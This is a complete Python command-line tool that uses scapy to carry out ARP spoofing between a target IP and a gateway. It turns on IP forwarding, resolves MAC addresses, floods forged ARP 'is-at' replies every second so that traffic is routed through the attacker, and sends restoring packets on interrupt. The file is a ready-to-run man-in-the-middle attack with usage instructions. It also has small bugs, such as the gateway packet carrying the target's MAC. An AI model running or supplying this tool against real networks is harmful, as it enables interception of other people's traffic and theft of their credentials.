import os
import platform
import re
import sys
import time

import colorama
from colorama import Fore
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send


class Main:
    def __init__(self, gateway, ip):
        self.gateway = gateway
        self.ip = ip
        self.vx = False

    def is_valid(self):
        reg = \
            r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
        return True if re.match(reg, self.gateway) and re.match(reg, self.ip) else False

    @staticmethod
    def set_forwarding(value):
        match platform.system():
            case "Linux" | "Darwin":
                with open("/proc/sys/net/ipv4/ip_forward", "r+") as f:
                    return f.write(value)

    @staticmethod
    def get_mac(ip):
        answer, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), verbose=0)
        if answer:
            return answer[0][1].src
        else:
            print("[!] Unable to get MAC Address..")

    def spoof(self):
        target_mac = self.get_mac(self.ip)
        self.set_forwarding("1")
        while True:
            try:
                # Start spoofing process
                time.sleep(1)
                if not self.vx:
                    send(ARP(pdst=self.ip, hwdst=target_mac, psrc=self.gateway, op="is-at"), verbose=0)
                    send(ARP(pdst=self.gateway, hwdst=target_mac, psrc=self.ip, op="is-at"), verbose=0)
                    print("[+] (ARP) Spoofing {}... [-] MAC Address: {}".format(self.ip, target_mac))
            except KeyboardInterrupt:
                self.vx = True
                self.unspoof()

    def unspoof(self):
        # Restore network if there are problems
        arp = ARP(pdst=self.ip, hwdst=self.get_mac(self.ip), psrc=self.gateway, hwsrc=self.get_mac(self.gateway))
        sec = 0
        while True:
            try:
                send(arp, verbose=1)
                sec = sec + 1
                if sec == 5:  # Send packets for X seconds
                    self.set_forwarding("0")
                    print("\n[*] Network Restored!\n")
                    sys.exit(1)
                time.sleep(1)
            except KeyboardInterrupt:
                print("\n[-] You are already restoring the network!")


if __name__ == "__main__":
    colorama.init(autoreset=True)
    syntax_error = Fore.RED + "[*] Usage: \"{} {} -g <gateway_ip> -i <ip_address>\""
    if ".exe" in sys.argv[0]:
        syntax_error = syntax_error.replace("{} ", "", 1).format(sys.argv[0])
    # Checking for args
    match len(sys.argv):
        case 5:
            if sys.argv[1] == "-g" and sys.argv[3] == "-i":
                instance = Main(sys.argv[2], sys.argv[4])
                if instance.is_valid():
                    instance.spoof()
                else:
                    print(Fore.RED + "[!] Invalid IP. Please try again!")
            else:
                print(syntax_error)
        case _:
            print(syntax_error)
